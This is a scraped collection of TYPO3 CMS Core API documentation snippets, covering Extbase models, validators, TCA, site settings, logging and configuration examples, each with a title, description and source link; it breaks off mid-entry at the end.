https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Annotation/Multiple.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage;\n\nclass Post extends AbstractEntity\n{\n    /**\n     * @var ObjectStorage<Comment>\n     */\n    public ObjectStorage $comments;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Getter and Setter for Title in Extbase Model\nDESCRIPTION: This snippet shows the implementation of getter and setter methods for the title property in a Tea model class. These methods are required for Extbase to access protected properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Model.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Returns the title.\n */\npublic function getTitle(): string\n{\n    return $this->title;\n}\n\n/**\n * Sets the title.\n */\npublic function setTitle(string $title): void\n{\n    $this->title = $title;\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Example Page Tree Structure for Mount Points in TYPO3\nDESCRIPTION: This code snippet shows the structure of a simple page tree with a mount point. It illustrates how a mount point (page 2) can reference another page (page 3) in the tree.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MountPoints/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: none\nCODE:\n```\npage   tree\n====== ====================\n1      Root\n2      ├── Basic Mount Point    <- mount point, mounting page 3\n3      └── Company              <- mounted by page 2\n4          └── About us\n```\n\n----------------------------------------\n\nTITLE: Migrating Apache Configuration for TYPO3 Backend Entry Point\nDESCRIPTION: This snippet shows the changes required in the Apache configuration to migrate the TYPO3 backend entry point. It removes the condition for directories and updates the rewrite rule.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/BackendEntryPoint/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: apache\nCODE:\n```\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^typo3/(.*)$ %{ENV:CWD}index.php [QSA,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteRule ^.*$ %{ENV:CWD}index.php [QSA,L]\n```\n\n----------------------------------------\n\nTITLE: Setting up RST Document Structure for Frontend Login Events\nDESCRIPTION: ReST markup for setting up documentation page structure, including includes, index entries, and table of contents for frontend login events documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/FrontendLogin/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; felogin\n..  index:: pair: Events; Frontend login\n..  _eventlist-felogin:\n\n\n=============\nFrontendLogin\n=============\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:frontend, the frontend login .\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Defining Person Model Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the Person class which extends AbstractEntity. It includes a protected property 'fullname' of type string, initialized as an empty string. This class is part of the BlogExample extension's domain model.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Annotation/Transient.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Person extends AbstractEntity\n{\n    protected string $fullname = '';\n}\n```\n\n----------------------------------------\n\nTITLE: Cleaning ModuleData Properties in TYPO3 Controller\nDESCRIPTION: This snippet demonstrates how to clean and restrict the values of ModuleData properties within a TYPO3 backend controller. It uses the clean method to ensure that a property's value is within a set of allowed values.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/ModuleData.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$allowedValues = ['foo', 'bar'];\n$this->moduleData->clean('property', $allowedValues);\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Columns for New Page Type\nDESCRIPTION: Configuration to customize which columns/fields should be displayed for the new Archive page type by copying all columns from the default page type and then customizing them.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/CreateNewPageType.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n// archive\n$GLOBALS['TCA']['pages']['types']['116'] = $GLOBALS['TCA']['pages']['types']['1'];\n// Now you can modify TCA the way you need by using Core API\n```\n\n----------------------------------------\n\nTITLE: Validating Float Numbers with Extbase\nDESCRIPTION: The FloatValidator determines whether a field is a floating point number. It is essential for fields dealing with decimal numbers, ensuring the accuracy and type safety in numeric fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n#[Validate(['validator' => 'Float'])]\nprotected float $price;\n```\n\n----------------------------------------\n\nTITLE: Configuring 'cert' in TYPO3\nDESCRIPTION: This snippet shows how to configure the 'cert' option for HTTP requests in TYPO3. This option allows specifying the path to a PEM formatted client-side certificate.  It is used for client authentication during SSL/TLS handshake.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['cert']\"\n```\n\n----------------------------------------\n\nTITLE: Accessing HTTP Configuration in TYPO3\nDESCRIPTION: This snippet demonstrates how to access the HTTP configuration options within the TYPO3 global configuration array. The configuration values are stored under the 'HTTP' key within the `$GLOBALS['TYPO3_CONF_VARS']` array. These options can be modified in `config/system/settings.php` or `config/system/additional.php`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']\"\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeCountriesEvaluatedEvent Class Interface in TYPO3\nDESCRIPTION: PHP class definition for an event that is triggered before countries are evaluated by the CountryProvider. Includes methods for getting and setting country arrays.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Country/BeforeCountriesEvaluatedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Country\\Event;\n\nclass BeforeCountriesEvaluatedEvent\n{\n    public function getCountries(): array\n    {\n        // Returns array of Country objects\n    }\n\n    public function setCountries(array $countries): void\n    {\n        // Sets the countries array\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Including Backend Modules Screenshot in RST Documentation\nDESCRIPTION: ReStructuredText directive for including and styling a screenshot of the TYPO3 backend modules layout. The figure is automatically generated and includes a shadow effect for visual enhancement.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/BackendModules/BackendModulesAreas.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/BackendModules/BackendModulesAreas.png\n   :class: with-shadow\n\n   An overview of the visual structure of the backend\n```\n\n----------------------------------------\n\nTITLE: Declaring AfterRecordSummaryForLocalizationEvent Class Methods\nDESCRIPTION: Defines getter and setter methods for columns and records in the AfterRecordSummaryForLocalizationEvent class. The class is used to manage record summaries during TYPO3 localization processes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/AfterRecordSummaryForLocalizationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass AfterRecordSummaryForLocalizationEvent {\n    public function getColumns(): array\n    \n    public function setColumns(array $columns)\n    \n    public function getRecords(): array\n    \n    public function setRecords(array $records)\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring 'verify' in TYPO3\nDESCRIPTION: This snippet illustrates configuring the 'verify' option for HTTP requests in TYPO3. This option controls the SSL certificate verification behavior of a request.  It can be set to true to verify certificates or to a path for a custom CA bundle.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_7\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['verify']\"\n```\n\n----------------------------------------\n\nTITLE: Control Management Methods\nDESCRIPTION: Core methods for enabling, disabling, and checking control states. These methods allow manipulation of file reference controls based on identifiers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyFileReferenceEnabledControlsEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: enableControl(string $identifier)\n    :returns: `bool`\n\n..  php:method:: disableControl(string $identifier)\n    :returns: `bool`\n\n..  php:method:: hasControl(string $identifier)\n    :returns: `bool`\n\n..  php:method:: isControlEnabled(string $identifier)\n    :returns: `bool`\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Extension in composer.json\nDESCRIPTION: Minimal configuration required in composer.json file to make a TYPO3 extension installable. Defines basic extension properties like name, type, description and TYPO3 version requirements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/ExtensionConfiguration.rst#2025-04-16_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\n{\\n    \\\"name\\\": \\\"ttn/tea\\\",\\n    \\\"type\\\": \\\"typo3-cms-extension\\\",\\n    \\\"description\\\": \\\"TYPO3 extension to catalog teas\\\",\\n    \\\"require\\\": {\\n        \\\"typo3/cms-core\\\": \\\"^11.5 || ^12.4\\\"\\n    }\\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Localized Labels in TCA Configuration - PHP\nDESCRIPTION: This PHP snippet demonstrates how to properly declare and access localized labels in the TCA configuration for TYPO3 extensions. It requires the complete path to the language file for referencing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Language.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n   'ctrl' => [\n       'title' => 'LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:tx_examples_dummy',\n       // ...\n   ],\n   // ...\n];\n```\n\n----------------------------------------\n\nTITLE: Boolean Settings Configuration in YAML\nDESCRIPTION: Example of defining a boolean type site setting with default value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingDefinitions.rst#2025-04-16_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nsettings:\n  foo:\n    type: bool\n    label: 'Foo'\n    default: true\n```\n\n----------------------------------------\n\nTITLE: Switch-Case Statement Usage in PHP\nDESCRIPTION: Explains the indenting and alignment for switch-case statements in PHP, including the use of fall-through comments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_14\n\nLANGUAGE: php\nCODE:\n```\nswitch ($useType) {\n    case 'extended':\n        $content .= $this->extendedUse();\n        // Fall through\n    case 'basic':\n        $content .= $this->basicUse();\n        break;\n    default:\n        $content .= $this->errorUse();\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Model Object Type Converter in TYPO3\nDESCRIPTION: Shows configuration for a custom model object type converter, including support for multiple source types like int, string, and array for flexible object conversion.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/TypeConverter.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\Property\\TypeConverter\\MyCustomModelObjectConverter:\n    tags:\n      - name: extbase.type_converter\n        priority: 10\n        target: MyVendor\\MyExtension\\Domain\\Model\\MyCustomModel\n        sources: int,string,array\n```\n\n----------------------------------------\n\nTITLE: Backend Localization Implementation\nDESCRIPTION: Demonstrates how to implement localization in TYPO3 backend context using LanguageServiceFactory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Php.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\npublic function __construct(\n    private readonly LanguageServiceFactory $languageServiceFactory\n) {}\n\npublic function process(): string\n{\n    $languageService = $this->languageServiceFactory->createFromUserPreferences($GLOBALS['BE_USER'] ?? null);\n    return $languageService->sL('LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:mystring');\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Local Package Repository\nDESCRIPTION: Commands to configure and install local packages like sitepackages from a local directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ncomposer config repositories.local_packages path './packages/*'\ncomposer require myvendor/sitepackage\n```\n\n----------------------------------------\n\nTITLE: RST Figure Definition for TYPO3 Backend Layout Screenshot\nDESCRIPTION: ReStructuredText directive defining an image figure for the backend layout overview, including path and styling class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/BackendLayouts/PageTreeLayoutOverview.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/BackendLayouts/PageTreeLayoutOverview.png\n   :class: with-shadow\n\n   Overview of the backend layouts used\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Icons in TYPO3 Extension\nDESCRIPTION: Demonstrates how to register custom icons using the TYPO3 IconRegistry in an extension's Icons.php configuration file. Used for adding custom icons to the TYPO3 backend interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/Icons.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// Example of icon registration in Icons.php\n$iconRegistry = \\TYPO3\\CMS\\Core\\Imaging\\IconRegistry::getInstance();\n$iconRegistry->registerIcon(\n    'my-custom-icon',\n    \\TYPO3\\CMS\\Core\\Imaging\\IconProvider\\SvgIconProvider::class,\n    ['source' => 'EXT:my_extension/Resources/Public/Icons/my-icon.svg']\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Styles for TYPO3 Blog Example Extension in YAML\nDESCRIPTION: This YAML configuration defines the default styles for a TYPO3 blog example extension. It specifies the name and label for the style set, and lists its dependencies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/_Sets/_blog_example/_default_config.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: t3docs/blog-example-styles\nlabel: Blog example default styles\ndependencies:\n  - t3docs/blog-example\n```\n\n----------------------------------------\n\nTITLE: Implementing RichTextNodeResolver Class in TYPO3\nDESCRIPTION: PHP class implementation of the RichTextNodeResolver that implements NodeResolverInterface. Handles resolution of rich text elements in the TYPO3 form system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/InTheBackend/PlugRte.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nnamespace MyVendor\\MyExtension\\Form\\Resolver;\n\nuse TYPO3\\CMS\\Backend\\Form\\NodeInterface;\nuse TYPO3\\CMS\\Backend\\Form\\NodeResolverInterface;\n\nclass RichTextNodeResolver implements NodeResolverInterface\n{\n    public function resolve(array $data, string $type, string $parentType): ?string\n    {\n        // Return rich text element class if conditions are met\n        return \\MyVendor\\MyExtension\\Form\\Element\\RichTextElement::class;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom FlashMessage Renderer in TYPO3 Extension\nDESCRIPTION: This snippet demonstrates how to use a custom FlashMessage renderer in a TYPO3 extension. It creates an instance of a custom renderer class and uses it to render flash messages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/Render.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse MyVendor\\SomeExtension\\Messaging\\MySpecialRenderer;\n\n$out = GeneralUtility::makeInstance(MySpecialRenderer::class)\n   ->render($flashMessages);\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Link Handling Events\nDESCRIPTION: ReStructuredText markup defining the documentation structure for TYPO3 Core link handling events, including includes, index entries, and table of contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/LinkHandling/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Link Handling\n..  _eventlist-core-link-handling:\n\n\n=============\nLink handling\n=============\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace LinkHandling.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Logger Instantiation with Constructor Injection in TYPO3\nDESCRIPTION: Example of instantiating a logger using constructor injection in a TYPO3 class. This is the recommended approach for getting a logger instance in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Logger/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Service;\n\nuse Psr\\Log\\LoggerInterface;\n\nclass MyClass\n{\n    private LoggerInterface $logger;\n\n    public function __construct(LoggerInterface $logger)\n    {\n        $this->logger = $logger;\n    }\n\n    public function doSomething(): void\n    {\n        $this->logger->info('Something happened');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Request Object Usage in Extbase Validator\nDESCRIPTION: Demonstrating how to access and utilize the PSR-7 request object within an Extbase validator to retrieve site settings or other request-related information\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/CustomValidator/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nclass MyRequestValidator extends AbstractValidator {\n    protected function isValid($value) {\n        $request = $this->getRequest();\n        $siteSetting = $request->getAttribute('site')->getSetting('myKey');\n        \n        if (!/* validation based on site settings */) {\n            $this->addError('Validation failed', 1234567890);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining PackagesMayHaveChangedEvent PHP Class in TYPO3 CMS Core\nDESCRIPTION: PHP class definition that serves as a marker event to trigger reordering of packages and package listings in TYPO3 Core. Located in the TYPO3\\CMS\\Core\\Package\\Event namespace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/PackagesMayHaveChangedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Package\\Event;\n\nclass PackagesMayHaveChangedEvent\n{\n    // Marker event to ensure that Core is re-triggering the package ordering and package listings\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Extension Type in composer.json (Third-party/Custom)\nDESCRIPTION: This JSON snippet shows how to define the type of a third-party or custom TYPO3 extension in the `composer.json` file. Setting the `type` to `typo3-cms-extension` ensures the extension is installed correctly by Composer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Concepts/SystemAndLocalExtensions.rst#2025-04-16_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"myvendor/my-extension\",\n    \"type\": \"typo3-cms-extension\",\n    \"...\": \"...\"\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 Frontend Configuration\nDESCRIPTION: This code snippet demonstrates how to access the frontend configuration array in TYPO3.  The `$GLOBALS['TYPO3_CONF_VARS']['FE']` array contains all the frontend-related configuration settings. These settings can be modified in `config/system/settings.php` or `config/system/additional.php`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/FE.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['FE']\"\n```\n\n----------------------------------------\n\nTITLE: Using RequestAnimationFrameEvent Strategy in TYPO3 JavaScript Event API\nDESCRIPTION: Demonstrates the RequestAnimationFrameEvent strategy which binds execution to the browser's RequestAnimationFrame API. This is suitable for event listeners that manipulate the DOM for better performance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/EventApi/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nimport RequestAnimationFrameEvent from '@typo3/core/event/request-animation-frame-event.js';\n\nnew RequestAnimationFrameEvent('scroll', function(e) {\n  // Animation Frame based event handling code\n}).bindTo(window);\n```\n\n----------------------------------------\n\nTITLE: Configuring Mail DSN for Symfony Mailer\nDESCRIPTION: This snippet sets the DSN configuration for Symfony mailer integrations. Different mail transports are available, providing versatility in how emails are handled in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_20\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['dsn']\n:type: text\n:Default: ''\n\n*only with transport=dsn* The DSN configuration of the Symfony mailer.\n```\n\n----------------------------------------\n\nTITLE: Filtering Countries in TYPO3 Country API\nDESCRIPTION: Illustrates how to use the CountryFilter class to filter countries based on inclusion and exclusion criteria in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Country/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Country\\CountryFilter;\n\n$filter = new CountryFilter();\n\n// Alpha-2 and Alpha-3 ISO codes can be used\n$filter\n    ->setOnlyCountries(['AT', 'DE', 'FR', 'DK'])\n    ->setExcludeCountries(['AUT', 'DK']);\n\n// Will be an array with \"Germany\" and \"France\"\n$filteredCountries = $this->countryProvider->getFiltered($filter);\n```\n\n----------------------------------------\n\nTITLE: Modifying XLIFF File Header for TYPO3 Extension\nDESCRIPTION: Example of how to modify the 'original' attribute in an XLIFF file to match the source file path for proper Crowdin integration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin/Faq.rst#2025-04-16_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>\n    <xliff version=\"1.0\">\n        <file source-language=\"en\" datatype=\"plaintext\" original=\"EXT:news/Resources/Private/Language/locallang.xlf\">\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 AfterExtensionStaticDatabaseContentHasBeenImportedEvent in PHP\nDESCRIPTION: This code reference shows the fully qualified namespace of the removed PSR-14 event in TYPO3 v13.0. Developers who were using this event should migrate to using the PackageInitializationEvent instead.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/ExtensionManager/AfterExtensionFilesHaveBeenImportedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Extensionmanager\\Event\\AfterExtensionStaticDatabaseContentHasBeenImportedEvent\n```\n\n----------------------------------------\n\nTITLE: Enabling Thumbnails in TYPO3\nDESCRIPTION: This snippet defines the configuration for enabling the use of thumbnails within the TYPO3 backend interface. It specifies that the value should be a boolean indicating whether thumbnails are active or not.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/GFX.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['GFX']['thumbnails'] = true;\n```\n\n----------------------------------------\n\nTITLE: Configuring RSS Feed Set for TYPO3 Blog Example in YAML\nDESCRIPTION: This YAML configuration defines the properties of an RSS feed set for a blog example in TYPO3 CMS. It specifies the name, label, and dependencies of the feed set. The feed set depends on the main blog example extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/_Sets/_blog_example/_rss_config.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: t3docs/blog-example-rss\nlabel: Blog example RSS feed\ndependencies:\n  - t3docs/blog-example\n```\n\n----------------------------------------\n\nTITLE: Debugging a Model in Fluid Template\nDESCRIPTION: A simple Fluid template code snippet that demonstrates how to debug an Extbase model using the debug ViewHelper, which helps identify the fully qualified PHP class name of the model.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendExtbaseModel/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:debug>{someModel}</f:debug>\n```\n\n----------------------------------------\n\nTITLE: Extracting Single Tags in TYPO3 HTML Parsing\nDESCRIPTION: This snippet demonstrates how to extract specific tags (img and br) from an HTML document using HtmlParser. This approach works with both standard and self-closing tags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ParsingHtml/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$result = $parseObj->splitTags('img,br', $testHTML);\n```\n\n----------------------------------------\n\nTITLE: Accessing SimpleDataHandlerController in TYPO3 CMS\nDESCRIPTION: This code snippet shows the PHP namespace for the SimpleDataHandlerController class in TYPO3 CMS. This controller is responsible for handling form data submitted through the '/record/commit' route.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/TceDb/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\Controller\\SimpleDataHandlerController\n```\n\n----------------------------------------\n\nTITLE: Displaying User Simulation Button Figure in RST\nDESCRIPTION: ReStructuredText markup for displaying a screenshot of the user simulation button from TYPO3's access control interface with added shadow styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AccessControl/SimulateUserButton.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AccessControl/SimulateUserButton.png\n   :class: with-shadow\n\n   The button to simulate another user\n```\n\n----------------------------------------\n\nTITLE: Accessing LogRecord properties using ArrayAccess in TYPO3\nDESCRIPTION: The LogRecord class implements the ArrayAccess interface, allowing properties to be accessed like a native array. This example shows how to access the requestId property of a LogRecord object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Model/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$logRecord['requestId']\n```\n\n----------------------------------------\n\nTITLE: Chaining Query Builder Methods in TYPO3\nDESCRIPTION: Example showing how the Query Builder provides a fluent interface that allows method chaining for building database queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$queryBuilder\n    ->select('uid')\n    ->from('pages');\n```\n\n----------------------------------------\n\nTITLE: Line Length Example\nDESCRIPTION: Illustrates the line length convention in TYPO3, where lines exceeding 130 characters should be split into multiple indented lines. The example shows how to break a long line of code while maintaining readability.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/GeneralRequirementsForPhpFiles.rst#2025-04-16_snippet_1\n\nLANGUAGE: 